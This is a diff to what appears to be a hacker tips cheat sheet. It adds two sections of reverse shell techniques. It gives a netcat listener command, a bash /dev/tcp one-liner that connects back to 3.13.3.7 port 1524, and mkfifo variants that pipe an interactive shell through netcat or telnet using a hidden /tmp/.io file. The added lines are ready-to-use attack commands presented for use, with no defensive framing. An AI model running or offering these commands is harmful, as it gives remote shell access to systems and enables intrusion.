@@ -253,6 +253,33 @@ Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from our system (cou
 # tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
 
+**20. Bash reverse shell**
+
+Start netcat to listen on port 1524 on your system:
+```
+$ nc -nvlp 1524
+```
+
+On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
+```
+$ bash -i 2>&1 >& /dev/tcp/3.13.3.7/1524 0>&1
+```
+
+**21. Reverse Shell without Bash**
+
+Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
+
+On the remote system:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
+```
+
+Telnet variant:
+```
+$ mkfifo /tmp/.io
+$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
+```
 
 --------------------------------------------------------------------------
 Shoutz: ADM
